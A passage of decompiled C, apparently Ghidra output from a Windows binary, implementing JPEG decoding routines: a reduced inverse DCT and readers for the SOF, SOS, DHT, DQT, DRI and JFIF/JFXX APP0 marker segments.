        iVar4 = (int)*param_3 * *local_c * 4;
        *piVar1 = iVar4;
        piVar1[8] = iVar4;
      }
      else {
        local_8 = (int)*param_3 * *local_c * 0x8000;
        iVar4 = (int)param_3[0x38] * local_c[0x38] * -0x1712 +
                (int)param_3[0x28] * local_c[0x28] * 0x1b37 +
                (int)param_3[0x18] * local_c[0x18] * -0x28ba + (int)param_3[8] * local_c[8] * 0x73fc
        ;
        *piVar1 = local_8 + iVar4 + 0x1000 >> 0xd;
        piVar1[8] = (local_8 - iVar4) + 0x1000 >> 0xd;
      }
    }
    param_3 = param_3 + 1;
    local_c = local_c + 1;
    piVar1 = piVar1 + 1;
    iVar3 = iVar3 + -1;
  } while (0 < iVar3);
  piVar1 = local_58;
  local_18 = param_5;
  iVar3 = 0;
  do {
    puVar2 = (undefined *)(*local_18 + param_4);
    if (((piVar1[1] == 0) && (piVar1[3] == 0)) && ((piVar1[5] == 0 && (piVar1[7] == 0)))) {
      local_11 = *(undefined *)(local_10 + (*piVar1 + 0x10 >> 5 & 0x3ffU));
      *puVar2 = local_11;
      puVar2[1] = local_11;
    }
    else {
      local_8 = *piVar1 * 0x8000;
      iVar4 = piVar1[7] * -0x1712 + piVar1[5] * 0x1b37 + piVar1[3] * -0x28ba + piVar1[1] * 0x73fc;
      *puVar2 = *(undefined *)(local_10 + (local_8 + iVar4 + 0x80000 >> 0x14 & 0x3ffU));
      puVar2[1] = *(undefined *)(local_10 + ((local_8 - iVar4) + 0x80000 >> 0x14 & 0x3ffU));
    }
    piVar1 = piVar1 + 8;
    iVar3 = iVar3 + 1;
    local_18 = local_18 + 1;
  } while (iVar3 < 2);
  return;
}



void FUN_0042bd14(int param_1,int param_2,short *param_3,int param_4,int *param_5)

{
  *(undefined *)(*param_5 + param_4) =
       *(undefined *)
        (*(int *)(param_1 + 0x144) + 0x80 +
        ((int)*param_3 * **(int **)(param_2 + 0x50) + 4 >> 3 & 0x3ffU));
  return;
}



undefined4 FUN_0042bd50(int *param_1)

{
  int *piVar1;
  int iVar2;
  
  *(undefined4 *)(*param_1 + 0x14) = 0x66;
  (**(code **)(*param_1 + 4))(param_1,1);
  if (*(int *)(param_1[0x6e] + 0xc) != 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x3d;
    (**(code **)*param_1)();
  }
  iVar2 = 0;
  piVar1 = param_1 + 0x39;
  do {
    *(undefined *)piVar1 = 0;
    *(undefined *)(piVar1 + 4) = 1;
    *(undefined *)(piVar1 + 8) = 5;
    iVar2 = iVar2 + 1;
    piVar1 = (int *)((int)piVar1 + 1);
  } while (iVar2 < 0x10);
  param_1[0x45] = 0;
  param_1[10] = 0;
  param_1[0x4b] = 0;
  param_1[0x46] = 0;
  *(undefined *)(param_1 + 0x47) = 1;
  *(undefined *)((int)param_1 + 0x11d) = 1;
  *(undefined *)((int)param_1 + 0x11e) = 0;
  *(undefined2 *)(param_1 + 0x48) = 1;
  *(undefined2 *)((int)param_1 + 0x122) = 1;
  param_1[0x49] = 0;
  *(undefined *)(param_1 + 0x4a) = 0;
  *(undefined4 *)(param_1[0x6e] + 0xc) = 1;
  return 1;
}



undefined4 FUN_0042be04(int *param_1,int param_2,int param_3)

{
  byte bVar1;
  byte bVar2;
  byte **ppbVar3;
  int iVar4;
  uint *puVar5;
  byte *pbVar6;
  byte *pbVar7;
  byte *pbVar8;
  uint uStack24;
  
  ppbVar3 = (byte **)param_1[6];
  pbVar8 = ppbVar3[1];
  pbVar6 = *ppbVar3;
  param_1[0x37] = param_2;
  param_1[0x38] = param_3;
  if (pbVar8 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar8 = ppbVar3[1];
    pbVar6 = *ppbVar3;
  }
  pbVar8 = pbVar8 + -1;
  bVar2 = *pbVar6;
  pbVar6 = pbVar6 + 1;
  if (pbVar8 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar8 = ppbVar3[1];
    pbVar6 = *ppbVar3;
  }
  pbVar8 = pbVar8 + -1;
  bVar1 = *pbVar6;
  pbVar6 = pbVar6 + 1;
  if (pbVar8 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar8 = ppbVar3[1];
    pbVar6 = *ppbVar3;
  }
  pbVar8 = pbVar8 + -1;
  param_1[0x35] = (uint)*pbVar6;
  pbVar6 = pbVar6 + 1;
  if (pbVar8 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar8 = ppbVar3[1];
    pbVar6 = *ppbVar3;
  }
  pbVar8 = pbVar8 + -1;
  pbVar7 = pbVar6 + 1;
  param_1[8] = (uint)*pbVar6 << 8;
  if (pbVar8 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar8 = ppbVar3[1];
    pbVar7 = *ppbVar3;
  }
  pbVar8 = pbVar8 + -1;
  param_1[8] = param_1[8] + (uint)*pbVar7;
  pbVar7 = pbVar7 + 1;
  if (pbVar8 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar8 = ppbVar3[1];
    pbVar7 = *ppbVar3;
  }
  pbVar8 = pbVar8 + -1;
  pbVar6 = pbVar7 + 1;
  param_1[7] = (uint)*pbVar7 << 8;
  if (pbVar8 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar8 = ppbVar3[1];
    pbVar6 = *ppbVar3;
  }
  pbVar8 = pbVar8 + -1;
  param_1[7] = param_1[7] + (uint)*pbVar6;
  pbVar6 = pbVar6 + 1;
  if (pbVar8 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar8 = ppbVar3[1];
    pbVar6 = *ppbVar3;
  }
  param_1[9] = (uint)*pbVar6;
  iVar4 = *param_1;
  *(int *)(iVar4 + 0x18) = param_1[0x68];
  *(int *)(iVar4 + 0x1c) = param_1[7];
  *(int *)(iVar4 + 0x20) = param_1[8];
  *(int *)(iVar4 + 0x24) = param_1[9];
  *(undefined4 *)(*param_1 + 0x14) = 100;
  (**(code **)(*param_1 + 4))(param_1,1);
  if (*(int *)(param_1[0x6e] + 0x10) != 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x3a;
    (**(code **)*param_1)();
  }
  if (((param_1[8] == 0) || (param_1[7] == 0)) || (param_1[9] < 1)) {
    *(undefined4 *)(*param_1 + 0x14) = 0x20;
    (**(code **)*param_1)();
  }
  if ((uint)bVar2 * 0x100 + (uint)bVar1 + -8 != param_1[9] * 3) {
    *(undefined4 *)(*param_1 + 0x14) = 0xb;
    (**(code **)*param_1)();
  }
  if (param_1[0x36] == 0) {
    iVar4 = (**(code **)param_1[1])(param_1,1,param_1[9] * 0x54);
    param_1[0x36] = iVar4;
  }
  uStack24 = 0;
  puVar5 = (uint *)param_1[0x36];
  do {
    pbVar8 = pbVar8 + -1;
    pbVar6 = pbVar6 + 1;
    if (param_1[9] <= (int)uStack24) {
      *(undefined4 *)(param_1[0x6e] + 0x10) = 1;
      *ppbVar3 = pbVar6;
      ppbVar3[1] = pbVar8;
      return 1;
    }
    puVar5[1] = uStack24;
    if (pbVar8 == (byte *)0x0) {
      iVar4 = (*(code *)ppbVar3[3])(param_1);
      if (iVar4 == 0) {
        return 0;
      }
      pbVar8 = ppbVar3[1];
      pbVar6 = *ppbVar3;
    }
    pbVar8 = pbVar8 + -1;
    *puVar5 = (uint)*pbVar6;
    pbVar6 = pbVar6 + 1;
    if (pbVar8 == (byte *)0x0) {
      iVar4 = (*(code *)ppbVar3[3])(param_1);
      if (iVar4 == 0) {
        return 0;
      }
      pbVar8 = ppbVar3[1];
      pbVar6 = *ppbVar3;
    }
    pbVar8 = pbVar8 + -1;
    bVar2 = *pbVar6;
    pbVar6 = pbVar6 + 1;
    puVar5[2] = (int)(uint)bVar2 >> 4;
    puVar5[3] = bVar2 & 0xf;
    if (pbVar8 == (byte *)0x0) {
      iVar4 = (*(code *)ppbVar3[3])(param_1);
      if (iVar4 == 0) {
        return 0;
      }
      pbVar8 = ppbVar3[1];
      pbVar6 = *ppbVar3;
    }
    puVar5[4] = (uint)*pbVar6;
    iVar4 = *param_1;
    *(uint *)(iVar4 + 0x18) = *puVar5;
    *(uint *)(iVar4 + 0x1c) = puVar5[2];
    *(uint *)(iVar4 + 0x20) = puVar5[3];
    *(uint *)(iVar4 + 0x24) = puVar5[4];
    *(undefined4 *)(*param_1 + 0x14) = 0x65;
    (**(code **)(*param_1 + 4))(param_1,1);
    uStack24 = uStack24 + 1;
    puVar5 = puVar5 + 0x15;
  } while( true );
}



undefined4 FUN_0042c184(int *param_1)

{
  byte bVar1;
  byte bVar2;
  byte **ppbVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  byte *pbVar7;
  uint *puVar8;
  byte *pbVar9;
  byte *pbVar10;
  int iStack40;
  uint **ppuStack20;
  
  ppbVar3 = (byte **)param_1[6];
  pbVar7 = ppbVar3[1];
  pbVar9 = *ppbVar3;
  if (*(int *)(param_1[0x6e] + 0x10) == 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x3e;
    (**(code **)*param_1)();
  }
  if (pbVar7 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar7 = ppbVar3[1];
    pbVar9 = *ppbVar3;
  }
  pbVar7 = pbVar7 + -1;
  bVar2 = *pbVar9;
  pbVar9 = pbVar9 + 1;
  if (pbVar7 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar7 = ppbVar3[1];
    pbVar9 = *ppbVar3;
  }
  pbVar7 = pbVar7 + -1;
  bVar1 = *pbVar9;
  pbVar9 = pbVar9 + 1;
  if (pbVar7 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar7 = ppbVar3[1];
    pbVar9 = *ppbVar3;
  }
  pbVar7 = pbVar7 + -1;
  uVar5 = (uint)*pbVar9;
  pbVar9 = pbVar9 + 1;
  iVar4 = *param_1;
  *(undefined4 *)(iVar4 + 0x14) = 0x67;
  *(uint *)(iVar4 + 0x18) = uVar5;
  (**(code **)(*param_1 + 4))(param_1,1);
  if ((((uint)bVar2 * 0x100 + (uint)bVar1 != uVar5 * 2 + 6) || (uVar5 == 0)) || (4 < uVar5)) {
    *(undefined4 *)(*param_1 + 0x14) = 0xb;
    (**(code **)*param_1)();
  }
  param_1[0x52] = uVar5;
  iStack40 = 0;
  ppuStack20 = (uint **)(param_1 + 0x53);
  if (uVar5 != 0) {
    do {
      if (pbVar7 == (byte *)0x0) {
        iVar4 = (*(code *)ppbVar3[3])(param_1);
        if (iVar4 == 0) {
          return 0;
        }
        pbVar7 = ppbVar3[1];
        pbVar9 = *ppbVar3;
      }
      pbVar7 = pbVar7 + -1;
      uVar6 = (uint)*pbVar9;
      pbVar9 = pbVar9 + 1;
      if (pbVar7 == (byte *)0x0) {
        iVar4 = (*(code *)ppbVar3[3])(param_1);
        if (iVar4 == 0) {
          return 0;
        }
        pbVar7 = ppbVar3[1];
        pbVar9 = *ppbVar3;
      }
      pbVar7 = pbVar7 + -1;
      bVar2 = *pbVar9;
      pbVar9 = pbVar9 + 1;
      puVar8 = (uint *)param_1[0x36];
      for (iVar4 = 0; iVar4 < param_1[9]; iVar4 = iVar4 + 1) {
        if (uVar6 == *puVar8) goto LAB_0042c340;
        puVar8 = puVar8 + 0x15;
      }
      iVar4 = *param_1;
      *(undefined4 *)(iVar4 + 0x14) = 5;
      *(uint *)(iVar4 + 0x18) = uVar6;
      (**(code **)*param_1)();
LAB_0042c340:
      *ppuStack20 = puVar8;
      puVar8[5] = (int)(uint)bVar2 >> 4;
      puVar8[6] = bVar2 & 0xf;
      iVar4 = *param_1;
      *(uint *)(iVar4 + 0x18) = uVar6;
      *(uint *)(iVar4 + 0x1c) = puVar8[5];
      *(uint *)(iVar4 + 0x20) = puVar8[6];
      *(undefined4 *)(*param_1 + 0x14) = 0x68;
      (**(code **)(*param_1 + 4))(param_1,1);
      iStack40 = iStack40 + 1;
      ppuStack20 = ppuStack20 + 1;
    } while (iStack40 < (int)uVar5);
  }
  if (pbVar7 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar7 = ppbVar3[1];
    pbVar9 = *ppbVar3;
  }
  pbVar7 = pbVar7 + -1;
  pbVar10 = pbVar9 + 1;
  param_1[100] = (uint)*pbVar9;
  if (pbVar7 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar7 = ppbVar3[1];
    pbVar10 = *ppbVar3;
  }
  pbVar7 = pbVar7 + -1;
  pbVar9 = pbVar10 + 1;
  param_1[0x65] = (uint)*pbVar10;
  if (pbVar7 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar7 = ppbVar3[1];
    pbVar9 = *ppbVar3;
  }
  bVar2 = *pbVar9;
  param_1[0x66] = (int)(uint)bVar2 >> 4;
  param_1[0x67] = bVar2 & 0xf;
  iVar4 = *param_1;
  *(int *)(iVar4 + 0x18) = param_1[100];
  *(int *)(iVar4 + 0x1c) = param_1[0x65];
  *(int *)(iVar4 + 0x20) = param_1[0x66];
  *(int *)(iVar4 + 0x24) = param_1[0x67];
  *(undefined4 *)(*param_1 + 0x14) = 0x69;
  (**(code **)(*param_1 + 4))(param_1,1);
  *(undefined4 *)(param_1[0x6e] + 0x14) = 0;
  param_1[0x24] = param_1[0x24] + 1;
  *ppbVar3 = pbVar9 + 1;
  ppbVar3[1] = pbVar7 + -1;
  return 1;
}



undefined4 FUN_0042c4c4(int *param_1)

{
  byte bVar1;
  byte bVar2;
  byte **ppbVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  undefined extraout_CL;
  byte *pbVar7;
  byte *pbVar8;
  byte **ppbVar9;
  byte *pbVar10;
  uint uStack312;
  int iStack308;
  byte *pbStack300;
  byte *pbStack296;
  undefined uStack292;
  byte bStack291;
  byte bStack290;
  byte bStack289;
  byte bStack288;
  byte bStack287;
  byte bStack286;
  byte bStack285;
  byte bStack284;
  byte bStack283;
  byte bStack282;
  byte bStack281;
  byte bStack280;
  byte bStack279;
  byte bStack278;
  byte bStack277;
  byte bStack276;
  byte abStack272 [256];
  
  ppbVar3 = (byte **)param_1[6];
  pbVar10 = ppbVar3[1];
  pbVar7 = *ppbVar3;
  if (pbVar10 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar10 = ppbVar3[1];
    pbVar7 = *ppbVar3;
  }
  pbVar10 = pbVar10 + -1;
  bVar1 = *pbVar7;
  pbVar7 = pbVar7 + 1;
  if (pbVar10 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar3[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar10 = ppbVar3[1];
    pbVar7 = *ppbVar3;
  }
  pbVar10 = pbVar10 + -1;
  pbVar8 = pbVar7 + 1;
  iVar4 = (uint)bVar1 * 0x100 + (uint)*pbVar7 + -2;
  do {
    if (iVar4 < 0x11) {
      if (iVar4 != 0) {
        *(undefined4 *)(*param_1 + 0x14) = 0xb;
        (**(code **)*param_1)();
      }
      *ppbVar3 = pbVar8;
      ppbVar3[1] = pbVar10;
      return 1;
    }
    if (pbVar10 == (byte *)0x0) {
      iVar5 = (*(code *)ppbVar3[3])(param_1);
      if (iVar5 == 0) {
        return 0;
      }
      pbVar10 = ppbVar3[1];
      pbVar8 = *ppbVar3;
    }
    pbVar10 = pbVar10 + -1;
    bVar1 = *pbVar8;
    uStack312 = (uint)bVar1;
    pbVar8 = pbVar8 + 1;
    iVar5 = *param_1;
    *(undefined4 *)(iVar5 + 0x14) = 0x50;
    *(uint *)(iVar5 + 0x18) = uStack312;
    (**(code **)(*param_1 + 4))(param_1,1);
    uStack292 = 0;
    iVar5 = 1;
    iStack308 = 0;
    pbStack300 = &bStack291;
    do {
      if (pbVar10 == (byte *)0x0) {
        iVar6 = (*(code *)ppbVar3[3])(param_1);
        if (iVar6 == 0) {
          return 0;
        }
        pbVar10 = ppbVar3[1];
        pbVar8 = *ppbVar3;
      }
      bVar2 = *pbVar8;
      pbVar8 = pbVar8 + 1;
      *pbStack300 = bVar2;
      iStack308 = iStack308 + (uint)bVar2;
      pbStack300 = pbStack300 + 1;
      pbVar10 = pbVar10 + -1;
      iVar5 = iVar5 + 1;
    } while (iVar5 < 0x11);
    iVar5 = *param_1;
    *(uint *)(iVar5 + 0x18) = (uint)bStack291;
    *(uint *)(iVar5 + 0x1c) = (uint)bStack290;
    *(uint *)(iVar5 + 0x20) = (uint)bStack289;
    *(uint *)(iVar5 + 0x24) = (uint)bStack288;
    *(uint *)(iVar5 + 0x28) = (uint)bStack287;
    *(uint *)(iVar5 + 0x2c) = (uint)bStack286;
    *(uint *)(iVar5 + 0x30) = (uint)bStack285;
    *(uint *)(iVar5 + 0x34) = (uint)bStack284;
    *(undefined4 *)(*param_1 + 0x14) = 0x56;
    (**(code **)(*param_1 + 4))(param_1,2);
    iVar5 = *param_1;
    *(uint *)(iVar5 + 0x18) = (uint)bStack283;
    *(uint *)(iVar5 + 0x1c) = (uint)bStack282;
    *(uint *)(iVar5 + 0x20) = (uint)bStack281;
    *(uint *)(iVar5 + 0x24) = (uint)bStack280;
    *(uint *)(iVar5 + 0x28) = (uint)bStack279;
    *(uint *)(iVar5 + 0x2c) = (uint)bStack278;
    *(uint *)(iVar5 + 0x30) = (uint)bStack277;
    *(uint *)(iVar5 + 0x34) = (uint)bStack276;
    *(undefined4 *)(*param_1 + 0x14) = 0x56;
    (**(code **)(*param_1 + 4))(param_1,2);
    if ((0x100 < iStack308) || (iVar4 + -0x11 < iStack308)) {
      *(undefined4 *)(*param_1 + 0x14) = 8;
      (**(code **)*param_1)();
    }
    iVar5 = 0;
    pbStack296 = abStack272;
    pbVar7 = pbStack296;
    if (0 < iStack308) {
      do {
        pbStack296 = pbVar7;
        if (pbVar10 == (byte *)0x0) {
          iVar6 = (*(code *)ppbVar3[3])(param_1);
          if (iVar6 == 0) {
            return 0;
          }
          pbVar10 = ppbVar3[1];
          pbVar8 = *ppbVar3;
        }
        pbVar10 = pbVar10 + -1;
        *pbStack296 = *pbVar8;
        pbVar8 = pbVar8 + 1;
        iVar5 = iVar5 + 1;
        pbVar7 = pbStack296 + 1;
      } while (iVar5 < iStack308);
    }
    iVar4 = (iVar4 + -0x11) - iStack308;
    if ((bVar1 & 0x10) == 0) {
      iVar5 = uStack312 + 0x2d;
    }
    else {
      iVar5 = uStack312 + 0x21;
      uStack312 = uStack312 - 0x10;
    }
    ppbVar9 = (byte **)(param_1 + iVar5);
    if (((int)uStack312 < 0) || (3 < (int)uStack312)) {
      iVar5 = *param_1;
      *(undefined4 *)(iVar5 + 0x14) = 0x1e;
      *(uint *)(iVar5 + 0x18) = uStack312;
      pbStack296 = (byte *)(**(code **)*param_1)();
    }
    if (*ppbVar9 == (byte *)0x0) {
      pbStack296 = (byte *)FUN_0042dcb4((int)param_1);
      *ppbVar9 = pbStack296;
    }
    FUN_00420fc8((char)pbStack296,(char)&uStack292,(char)*ppbVar9,*ppbVar9,&uStack292,0x11);
    FUN_00420fc8((char)abStack272,(char)(*ppbVar9 + 0x11),extraout_CL,*ppbVar9 + 0x11,abStack272,
                 0x100);
  } while( true );
}



undefined4 FUN_0042c7f8(int *param_1)

{
  byte bVar1;
  byte **ppbVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  ushort uVar6;
  uint uVar7;
  ushort *puVar8;
  byte *pbVar9;
  byte *pbVar10;
  byte *pbVar11;
  int iStack36;
  int *piStack20;
  
  ppbVar2 = (byte **)param_1[6];
  pbVar11 = ppbVar2[1];
  pbVar9 = *ppbVar2;
  if (pbVar11 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar2[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar11 = ppbVar2[1];
    pbVar9 = *ppbVar2;
  }
  pbVar11 = pbVar11 + -1;
  bVar1 = *pbVar9;
  pbVar9 = pbVar9 + 1;
  if (pbVar11 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar2[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar11 = ppbVar2[1];
    pbVar9 = *ppbVar2;
  }
  pbVar11 = pbVar11 + -1;
  pbVar10 = pbVar9 + 1;
  iVar4 = (uint)bVar1 * 0x100 + (uint)*pbVar9 + -2;
  do {
    iVar3 = iVar4;
    if (iVar3 < 1) {
      if (iVar3 != 0) {
        *(undefined4 *)(*param_1 + 0x14) = 0xb;
        (**(code **)*param_1)();
      }
      *ppbVar2 = pbVar10;
      ppbVar2[1] = pbVar11;
      return 1;
    }
    if (pbVar11 == (byte *)0x0) {
      iVar4 = (*(code *)ppbVar2[3])(param_1);
      if (iVar4 == 0) {
        return 0;
      }
      pbVar11 = ppbVar2[1];
      pbVar10 = *ppbVar2;
    }
    pbVar11 = pbVar11 + -1;
    bVar1 = *pbVar10;
    pbVar10 = pbVar10 + 1;
    iVar5 = (int)(uint)bVar1 >> 4;
    uVar7 = bVar1 & 0xf;
    iVar4 = *param_1;
    *(undefined4 *)(iVar4 + 0x14) = 0x51;
    *(uint *)(iVar4 + 0x18) = uVar7;
    *(int *)(iVar4 + 0x1c) = iVar5;
    (**(code **)(*param_1 + 4))(param_1,1);
    if (3 < uVar7) {
      iVar4 = *param_1;
      *(undefined4 *)(iVar4 + 0x14) = 0x1f;
      *(uint *)(iVar4 + 0x18) = uVar7;
      (**(code **)*param_1)();
    }
    if (param_1[uVar7 + 0x29] == 0) {
      iVar4 = FUN_0042dc9c((int)param_1);
      param_1[uVar7 + 0x29] = iVar4;
    }
    puVar8 = (ushort *)param_1[uVar7 + 0x29];
    iStack36 = 0;
    piStack20 = &DAT_00440da8;
    do {
      if (iVar5 == 0) {
        if (pbVar11 == (byte *)0x0) {
          iVar4 = (*(code *)ppbVar2[3])(param_1);
          if (iVar4 == 0) {
            return 0;
          }
          pbVar11 = ppbVar2[1];
          pbVar10 = *ppbVar2;
        }
        uVar6 = (ushort)*pbVar10;
      }
      else {
        if (pbVar11 == (byte *)0x0) {
          iVar4 = (*(code *)ppbVar2[3])(param_1);
          if (iVar4 == 0) {
            return 0;
          }
          pbVar11 = ppbVar2[1];
          pbVar10 = *ppbVar2;
        }
        pbVar11 = pbVar11 + -1;
        bVar1 = *pbVar10;
        pbVar10 = pbVar10 + 1;
        if (pbVar11 == (byte *)0x0) {
          iVar4 = (*(code *)ppbVar2[3])(param_1);
          if (iVar4 == 0) {
            return 0;
          }
          pbVar11 = ppbVar2[1];
          pbVar10 = *ppbVar2;
        }
        uVar6 = (ushort)bVar1 * 0x100 + (ushort)*pbVar10;
      }
      pbVar11 = pbVar11 + -1;
      pbVar10 = pbVar10 + 1;
      puVar8[*piStack20] = uVar6;
      iStack36 = iStack36 + 1;
      piStack20 = piStack20 + 1;
    } while (iStack36 < 0x40);
    if (1 < *(int *)(*param_1 + 0x68)) {
      iStack36 = 0;
      do {
        iVar4 = *param_1;
        *(uint *)(iVar4 + 0x18) = (uint)*puVar8;
        *(uint *)(iVar4 + 0x1c) = (uint)puVar8[1];
        *(uint *)(iVar4 + 0x20) = (uint)puVar8[2];
        *(uint *)(iVar4 + 0x24) = (uint)puVar8[3];
        *(uint *)(iVar4 + 0x28) = (uint)puVar8[4];
        *(uint *)(iVar4 + 0x2c) = (uint)puVar8[5];
        *(uint *)(iVar4 + 0x30) = (uint)puVar8[6];
        *(uint *)(iVar4 + 0x34) = (uint)puVar8[7];
        *(undefined4 *)(*param_1 + 0x14) = 0x5d;
        (**(code **)(*param_1 + 4))(param_1,2);
        iStack36 = iStack36 + 8;
        puVar8 = puVar8 + 8;
      } while (iStack36 < 0x40);
    }
    iVar4 = iVar3 + -0x41;
    if (iVar5 != 0) {
      iVar4 = iVar3 + -0x81;
    }
  } while( true );
}



undefined4 FUN_0042ca94(int *param_1)

{
  byte bVar1;
  byte **ppbVar2;
  int iVar3;
  int iVar4;
  byte *pbVar5;
  byte *pbVar6;
  byte *pbVar7;
  
  ppbVar2 = (byte **)param_1[6];
  pbVar5 = *ppbVar2;
  pbVar7 = ppbVar2[1];
  if (pbVar7 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar2[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar5 = *ppbVar2;
    pbVar7 = ppbVar2[1];
  }
  pbVar7 = pbVar7 + -1;
  bVar1 = *pbVar5;
  pbVar5 = pbVar5 + 1;
  if (pbVar7 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar2[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar5 = *ppbVar2;
    pbVar7 = ppbVar2[1];
  }
  pbVar7 = pbVar7 + -1;
  pbVar6 = pbVar5 + 1;
  if ((uint)bVar1 * 0x100 + (uint)*pbVar5 != 4) {
    *(undefined4 *)(*param_1 + 0x14) = 0xb;
    (**(code **)*param_1)();
  }
  if (pbVar7 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar2[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar6 = *ppbVar2;
    pbVar7 = ppbVar2[1];
  }
  pbVar7 = pbVar7 + -1;
  bVar1 = *pbVar6;
  pbVar6 = pbVar6 + 1;
  if (pbVar7 == (byte *)0x0) {
    iVar4 = (*(code *)ppbVar2[3])(param_1);
    if (iVar4 == 0) {
      return 0;
    }
    pbVar6 = *ppbVar2;
    pbVar7 = ppbVar2[1];
  }
  iVar4 = (uint)bVar1 * 0x100 + (uint)*pbVar6;
  iVar3 = *param_1;
  *(undefined4 *)(iVar3 + 0x14) = 0x52;
  *(int *)(iVar3 + 0x18) = iVar4;
  (**(code **)(*param_1 + 4))(param_1,1);
  param_1[0x45] = iVar4;
  *ppbVar2 = pbVar6 + 1;
  ppbVar2[1] = pbVar7 + -1;
  return 1;
}



void FUN_0042cb80(int *param_1,char *param_2,uint param_3,int param_4)

{
  char cVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = param_3 + param_4;
  if ((((param_3 < 0xe) || (*param_2 != 'J')) || (param_2[1] != 'F')) ||
     (((param_2[2] != 'I' || (param_2[3] != 'F')) || (param_2[4] != '\0')))) {
    if (((param_3 < 6) || (*param_2 != 'J')) ||
       ((param_2[1] != 'F' || (((param_2[2] != 'X' || (param_2[3] != 'X')) || (param_2[4] != '\0')))
        ))) {
      iVar2 = *param_1;
      *(undefined4 *)(iVar2 + 0x14) = 0x4d;
      *(int *)(iVar2 + 0x18) = iVar3;
      (**(code **)(*param_1 + 4))(param_1,1);
    }
    else {
      cVar1 = param_2[5];
      if (cVar1 == '\x10') {
        iVar2 = *param_1;
        *(undefined4 *)(iVar2 + 0x14) = 0x6c;
        *(int *)(iVar2 + 0x18) = iVar3;
        (**(code **)(*param_1 + 4))(param_1,1);
      }
      else if (cVar1 == '\x11') {
        iVar2 = *param_1;
        *(undefined4 *)(iVar2 + 0x14) = 0x6d;
        *(int *)(iVar2 + 0x18) = iVar3;
        (**(code **)(*param_1 + 4))(param_1,1);
      }
      else if (cVar1 == '\x13') {
        iVar2 = *param_1;
        *(undefined4 *)(iVar2 + 0x14) = 0x6e;
        *(int *)(iVar2 + 0x18) = iVar3;
        (**(code **)(*param_1 + 4))(param_1,1);
      }
      else {
        iVar2 = *param_1;
        *(undefined4 *)(iVar2 + 0x14) = 0x59;
        *(uint *)(iVar2 + 0x18) = (uint)(byte)param_2[5];
        *(int *)(iVar2 + 0x1c) = iVar3;
        (**(code **)(*param_1 + 4))(param_1,1);
      }
    }
  }
  else {
    param_1[0x46] = 1;
    *(char *)(param_1 + 0x47) = param_2[5];
    *(char *)((int)param_1 + 0x11d) = param_2[6];
    *(char *)((int)param_1 + 0x11e) = param_2[7];
    *(ushort *)(param_1 + 0x48) = (ushort)(byte)param_2[8] * 0x100 + (ushort)(byte)param_2[9];
    *(ushort *)((int)param_1 + 0x122) =
         (ushort)(byte)param_2[10] * 0x100 + (ushort)(byte)param_2[0xb];
    if (*(char *)(param_1 + 0x47) != '\x01') {
      iVar2 = *param_1;
      *(undefined4 *)(iVar2 + 0x14) = 0x77;
      *(uint *)(iVar2 + 0x18) = (uint)*(byte *)(param_1 + 0x47);
      *(uint *)(iVar2 + 0x1c) = (uint)*(byte *)((int)param_1 + 0x11d);
      (**(code **)(*param_1 + 4))(param_1,0xffffffff);
    }
    iVar2 = *param_1;
    *(uint *)(iVar2 + 0x18) = (uint)*(byte *)(param_1 + 0x47);
    *(uint *)(iVar2 + 0x1c) = (uint)*(byte *)((int)param_1 + 0x11d);
    *(uint *)(iVar2 + 0x20) = (uint)*(ushort *)(param_1 + 0x48);
    *(uint *)(iVar2 + 0x24) = (uint)*(ushort *)((int)param_1 + 0x122);
    *(uint *)(iVar2 + 0x28) = (uint)*(byte *)((int)param_1 + 0x11e);
    *(undefined4 *)(*param_1 + 0x14) = 0x57;
    (**(code **)(*param_1 + 4))(param_1,1);
